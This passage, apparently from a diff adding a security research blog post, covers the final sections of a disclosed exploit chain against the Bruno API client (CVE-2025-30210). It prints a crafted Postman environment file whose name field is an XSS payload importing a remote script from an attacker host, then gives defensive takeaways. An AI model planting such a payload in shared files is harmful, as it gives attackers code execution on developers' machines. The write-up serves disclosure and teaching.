+<p><img src="malicious_env.png" alt="Malicious Postman environment with an XSS payload as its name"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;id&#34;</span>: <span style="color:#f1fa8c">&#34;ab8239b5-6cfc-4f1b-b688-86073aa0f58e&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;name&#34;</span>: <span style="color:#f1fa8c">&#34;&lt;img/src/onerror=import(&#39;http:&lt;IP_ADDR&gt;/a.js&#39;)&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;values&#34;</span>: [],
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;_postman_variable_scope&#34;</span>: <span style="color:#f1fa8c">&#34;environment&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;_postman_exported_at&#34;</span>: <span style="color:#f1fa8c">&#34;2025-01-27T15:37:32.739Z&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;_postman_exported_using&#34;</span>: <span style="color:#f1fa8c">&#34;Postman/11.30.0&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>When the victim <strong>imports</strong> this collection into Bruno, the environment name is rendered, the XSS fires, our remote payload is pulled and the killchain runs — all from a file that looks like a perfectly normal API collection.</p>
+<h2 id="72-the-full-chain-in-action">7.2 The full chain in action</h2>
+<p>Here is the whole thing end to end — importing the malicious environment, the XSS firing on the rendered name, the remote payload being pulled and, finally, code execution on the victim&rsquo;s machine :</p>
+<video controls muted playsinline preload="metadata" width="100%">
+  <source src="demo.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+<hr>
+<h1 id="8-conclusion">8. Conclusion</h1>
+<p>None of the three weaknesses is spectacular on its own : an XSS in a name field, an overly permissive CSP, a couple of unfiltered file helpers. But chained together they turn a JSON file shared between developers into reliable code execution. A few takeaways :</p>
+<ul>
+<li><strong>Electron&rsquo;s security flags conflict in non-obvious ways</strong> — <code>nodeIntegration: true</code> looked catastrophic but was neutralised by <code>contextIsolation</code>.</li>
+<li><strong>A wildcard <code>script-src</code> defeats the entire point of a CSP.</strong> It single-handedly removed the only mitigation standing between a 50-char XSS and a full remote payload.</li>
+<li><strong>Whatever you expose over <code>contextBridge</code>/IPC is attack surface.</strong> Exposing a generic <code>invoke</code> hands the renderer the keys to every handler in the main process.</li>
+</ul>
+<p>Responsible disclosure was carried out with the Bruno team. The chain is tracked as <a href="https://github.com/usebruno/bruno/security/advisories/GHSA-fqxc-cxph-9vq8">CVE-2025-30210</a> (GHSA-fqxc-cxph-9vq8, CVSS 8.7) and was fixed in Bruno 1.39.1.</p>
+<p>Thanks for reading, and feel free to reach out <a href="https://twitter.com/ottersecx">@ottersecx</a> if you want to talk Electron internals.</p>
+<hr>
+<p><em>Note : the grammar and phrasing of this article have been corrected and reworded with the help of an LLM.</em></p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+  <div class="blog-post-comments">
+    
+      <div id="cactus-comments-thread">
+  <script>
+  initComments({
+    node: document.getElementById("cactus-comments-thread"),
+    defaultHomeserverUrl: 'https:\/\/matrix.cactus.chat:8448',
+    serverName: 'cactus.chat',
+    siteName: "sneakyottersec",
+    commentSectionId: "\/posts\/bruno\/"
+  })
+</script>
+</div>
+
+    
+  </div>
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">All posts</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0-introduction">0. Introduction</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#11-the-attack-surface">1.1 The attack surface</a></li>
+    <li><a href="#12-inner-working--processes-and-ipc">1.2 Inner working : processes and IPC</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#21-unpacking-appasar">2.1 Unpacking <code>app.asar</code></a></li>
+    <li><a href="#22-indexjs--the-security-configuration">2.2 <code>index.js</code> : the security configuration</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#31-finding-the-entry-point">3.1 Finding the entry point</a></li>
+    <li><a href="#32-the-50-characters-problem">3.2 The 50 characters problem</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#41-is-this-a-real-csp-">4.1 Is this a real CSP ?</a></li>
+    <li><a href="#42-beating-the-50-char-limit">4.2 Beating the 50 char limit</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#51-a-quick-reminder-on-context-isolation-and-ipc">5.1 A quick reminder on Context Isolation and IPC</a></li>
+    <li><a href="#52-searching-for-exposed-functions">5.2 Searching for exposed functions</a></li>
+    <li><a href="#53-renderernew-file--arbitrary-file-creation">5.3 <code>renderer:new-file</code> — arbitrary file creation</a></li>
+    <li><a href="#54-renderersave-file--arbitrary-content">5.4 <code>renderer:save-file</code> — arbitrary content</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#61-the-xss-loader">6.1 The XSS loader</a></li>
+    <li><a href="#62-the-ipc-payload">6.2 The IPC payload</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#71-crafting-a-malicious-environment">7.1 Crafting a malicious environment</a></li>
+    <li><a href="#72-the-full-chain-in-action">7.2 The full chain in action</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&text=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&title=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&is_video=false&description=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion&body=Check out this article: https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&title=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&title=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&name=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion&description=%3ch1%20id%3d%22attacking-bruno--a-small-electron-for-a-nuclear-reaction%22%3eAttacking%20Bruno%20%3a%20a%20small%20Electron%20for%20a%20nuclear%20reaction%3c%2fh1%3e%0a%3ch2%20id%3d%220-introduction%22%3e0.%20Introduction%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22https%3a%2f%2fwww.usebruno.com%2f%22%3eBruno%3c%2fa%3e%20is%20the%20open-source%20alternative%20to%20Postman.%20Both%20tools%20are%20used%20for%20API%20testing%20and%20development%20and%20both%20aim%20at%20making%20API%20workflows%20less%20painful%2c%20which%20makes%20them%20a%20staple%20of%20any%20developer%26rsquo%3bs%20toolbox.%20Bruno%20being%20an%20Electron%20application%2c%20it%20inherits%20the%20whole%20web%20attack%20surface%20%3cem%3eplus%3c%2fem%3e%20a%20desktop%20one%20%e2%80%94%20and%20that%20combination%20is%20exactly%20what%20we%20are%20going%20to%20abuse%20here.%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fbruno%2f&t=Attacking%20Bruno%20%3a%20Peeling%20the%20Brunion" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2026  ottersec 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">All posts</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
